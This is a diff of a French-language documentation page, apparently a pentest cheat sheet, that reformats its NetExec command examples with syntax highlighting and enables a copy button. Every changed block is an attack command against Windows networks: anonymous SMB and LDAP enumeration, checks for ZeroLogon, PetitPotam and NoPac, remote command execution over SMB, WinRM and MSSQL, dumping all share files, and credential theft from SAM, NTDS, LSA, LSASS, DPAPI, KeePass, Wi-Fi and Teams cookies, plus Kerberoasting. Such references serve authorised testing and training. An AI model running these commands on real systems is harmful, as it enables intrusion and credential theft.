@@ -7838,136 +7838,136 @@
 
 <h3 id="smb">SMB</h3>
 <p>Usage de base :</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot;
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span>
+</span></code></pre></div>
 <p>Usage de base, en auth local:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; --local-auth
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--local-auth
+</span></code></pre></div>
 <p>Usage de base, avec un ticket en .ccache :</p>
-<pre><code class="language-bash">export KRB5CCNAME=/fichier/truc.ccache
-
-netexec smb $ip --use-kcache
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/fichier/truc.ccache
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>--use-kcache
+</span></code></pre></div>
 <h4 id="enumeration">Enumération</h4>
 <p>Check pour vulnérabilités sur le DC (petitpotam, zerologon et NoPac) :</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; -M Petitpotam
-
-netexec smb $ip -u &quot;&quot; -p &quot;&quot; -M NoPac
-
-netexec smb $ip -u &quot;&quot; -p &quot;&quot; -M zerologon
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-M<span class="w"> </span>Petitpotam
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-M<span class="w"> </span>NoPac
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-M<span class="w"> </span>zerologon
+</span></code></pre></div>
 <p>Enumération des hosts présents sur le réseau:</p>
-<pre><code class="language-bash">netexec smb 192.168.0.0/24
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.0.0/24
+</span></code></pre></div>
 <p>Enumération des utilisateurs sur un host ou sur le DC:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; --users
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--users
+</span></code></pre></div>
 <p>Enumération des partages samba:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; --shares
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--shares
+</span></code></pre></div>
 <p>Enumération des groupes:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; --groups
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--groups
+</span></code></pre></div>
 <p>Enumération des DD:</p>
-<pre><code class="language-bash">netexec -u &quot;&quot; -p &quot;&quot; --disks
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>netexec<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--disks
+</span></code></pre></div>
 <p>Enumération des utilisateurs loggués:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; --loggedon-users
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--loggedon-users
+</span></code></pre></div>
 <p>Enumération de la politique de mot de passe:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; --pass-pol
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--pass-pol
+</span></code></pre></div>
 <p>Voir si un service "spooler" est actif:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; -M spooler
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-M<span class="w"> </span>spooler
+</span></code></pre></div>
 <p>Voir si un service "webdav" est actif:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; -M webdav
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-M<span class="w"> </span>webdav
+</span></code></pre></div>
 <h4 id="execution-de-commandes">Exécution de commandes</h4>
 <p>Exécuter une commande via wmi/at/smb:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; -x whoami
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-x<span class="w"> </span>whoami
+</span></code></pre></div>
 <h4 id="partages-samba">Partages samba</h4>
 <p>Spidering des partages:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; --spider
-netexec smb $ip -u &quot;&quot; -p &quot;&quot; -M spider_plus
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--spider
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-M<span class="w"> </span>spider_plus
+</span></code></pre></div>
 <p>Dump de tout les fichiers:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; -M spider_plus -o READ_ONLY=false
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-M<span class="w"> </span>spider_plus<span class="w"> </span>-o<span class="w"> </span><span class="nv">READ_ONLY</span><span class="o">=</span><span class="nb">false</span>
+</span></code></pre></div>
 <h4 id="uploaddownload-de-fichiers">Upload/Download de fichiers</h4>
 <p>Download d'un fichier:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; --get-file \\Windows\\Temps\\test.txt /dossier/local/test.txt
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--get-file<span class="w"> </span><span class="se">\\</span>Windows<span class="se">\\</span>Temps<span class="se">\\</span>test.txt<span class="w"> </span>/dossier/local/test.txt
+</span></code></pre></div>
 <p>Upload d'un fichier:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; --put-file \\Windows\\Temps\\test.txt /dossier/local/test.txt
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--put-file<span class="w"> </span><span class="se">\\</span>Windows<span class="se">\\</span>Temps<span class="se">\\</span>test.txt<span class="w"> </span>/dossier/local/test.txt
+</span></code></pre></div>
 <h4 id="dump">Dump</h4>
 <p>SAM:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; --sam
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--sam
+</span></code></pre></div>
 <p>NTDS:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; --ntds
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--ntds
+</span></code></pre></div>
 <p>LSA:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; --lsa
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--lsa
+</span></code></pre></div>
 <p>LSASS:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; -M lsassy
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-M<span class="w"> </span>lsassy
+</span></code></pre></div>
 <p>Password Wifi:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; -M wireless
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-M<span class="w"> </span>wireless
+</span></code></pre></div>
 <p>Keepass:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; -M keepass_discover
-netexec smb $ip -u &quot;&quot; -p &quot;&quot; -M keepass_trigger -o KEEPASS_CONFIG_PATH=&quot;path_from_module_discovery&quot;
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-M<span class="w"> </span>keepass_discover
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-M<span class="w"> </span>keepass_trigger<span class="w"> </span>-o<span class="w"> </span><span class="nv">KEEPASS_CONFIG_PATH</span><span class="o">=</span><span class="s2">&quot;path_from_module_discovery&quot;</span>
+</span></code></pre></div>
 <p>DPAPI:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; --dpapi
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--dpapi
+</span></code></pre></div>
 <p>Cookie Teams:</p>
-<pre><code class="language-bash">netexec smb $ip -u &quot;&quot; -p &quot;&quot; -M teams_localdb
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-M<span class="w"> </span>teams_localdb
+</span></code></pre></div>
 <h3 id="ldap">LDAP</h3>
 <p>Asreproasting:</p>
-<pre><code class="language-bash">netexec ldap $ip -u &quot;&quot; -p &quot;&quot; --asreproast output.txt
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>netexec<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--asreproast<span class="w"> </span>output.txt
+</span></code></pre></div>
 <p>Kerberoasting:</p>
-<pre><code class="language-bash">netexec ldap $ip -u &quot;&quot; -p &quot;&quot; --kerberoasting output.txt
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>netexec<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--kerberoasting<span class="w"> </span>output.txt
+</span></code></pre></div>
 <p>Unconstrained delegation:</p>
-<pre><code class="language-bash">netexec ldap $ip -u &quot;&quot; -p &quot;&quot; --trusted-to-delegate
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>netexec<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--trusted-to-delegate
+</span></code></pre></div>
 <p>Quota de compte machine:</p>
-<pre><code class="language-bash">netexec ldap $ip -u &quot;&quot; -p &quot;&quot; -M maq
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>netexec<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-M<span class="w"> </span>maq
+</span></code></pre></div>
 <p>Description utilisateur:</p>
-<pre><code class="language-bash">netexec ldap $ip -u &quot;&quot; -p &quot;&quot; -M users_desc
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>netexec<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-M<span class="w"> </span>users_desc
+</span></code></pre></div>
 <h3 id="rdp">RDP</h3>
 <p>Screenshot:</p>
-<pre><code class="language-bash">netexec rdp &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --screenshot --screentime &lt;second&gt;
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>netexec<span class="w"> </span>rdp<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--screenshot<span class="w"> </span>--screentime<span class="w"> </span>&lt;second&gt;
+</span></code></pre></div>
 <h3 id="winrm">WINRM</h3>
 <p>Exécution de commande:</p>
-<pre><code class="language-bash">netexec winrm 192.168.255.131 -u user -p 'password' -X whoami
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>netexec<span class="w"> </span>winrm<span class="w"> </span><span class="m">192</span>.168.255.131<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;password&#39;</span><span class="w"> </span>-X<span class="w"> </span>whoami
+</span></code></pre></div>
 <h3 id="mssql">MSSQL</h3>
 <p>Privesc:</p>
-<pre><code class="language-bash">netexec mssql &lt;ip&gt; -u user -p password -M mssql_priv
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>netexec<span class="w"> </span>mssql<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-M<span class="w"> </span>mssql_priv
+</span></code></pre></div>
 <p>Commandes MSSQL:</p>
-<pre><code class="language-bash">netexec mssql 10.10.10.52 -u admin -p 'password' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>netexec<span class="w"> </span>mssql<span class="w"> </span><span class="m">10</span>.10.10.52<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;password&#39;</span><span class="w"> </span>--local-auth<span class="w"> </span>-q<span class="w"> </span><span class="s1">&#39;SELECT name FROM master.dbo.sysdatabases;&#39;</span>
+</span></code></pre></div>
 <p>Commandes via xp_cmdshell:</p>
-<pre><code class="language-bash">netexec mssql 10.10.10.59 -u sa -p 'password' --local-auth -x whoami
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>netexec<span class="w"> </span>mssql<span class="w"> </span><span class="m">10</span>.10.10.59<span class="w"> </span>-u<span class="w"> </span>sa<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;password&#39;</span><span class="w"> </span>--local-auth<span class="w"> </span>-x<span class="w"> </span>whoami
+</span></code></pre></div>
 <p>Upload d'un fichier:</p>
-<pre><code class="language-bash">netexec mssql 192.168.212.134 -u admin -p password --put-file /tmp/users C:\\Windows\\Temp\\whoami.txt
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>netexec<span class="w"> </span>mssql<span class="w"> </span><span class="m">192</span>.168.212.134<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>--put-file<span class="w"> </span>/tmp/users<span class="w"> </span>C:<span class="se">\\</span>Windows<span class="se">\\</span>Temp<span class="se">\\</span>whoami.txt
+</span></code></pre></div>
 <p>Download d'un fichier:</p>
-<pre><code class="language-bash">netexec mssql 10.10.10.52 -u admin -p 'password' --get-file C:\\Windows\\Temp\\whoami.txt /tmp/file
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>netexec<span class="w"> </span>mssql<span class="w"> </span><span class="m">10</span>.10.10.52<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;password&#39;</span><span class="w"> </span>--get-file<span class="w"> </span>C:<span class="se">\\</span>Windows<span class="se">\\</span>Temp<span class="se">\\</span>whoami.txt<span class="w"> </span>/tmp/file
+</span></code></pre></div>
 
 
 
@@ -8017,7 +8017,7 @@ netexec smb $ip -u &quot;&quot; -p &quot;&quot; -M keepass_trigger -o KEEPASS_CO
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
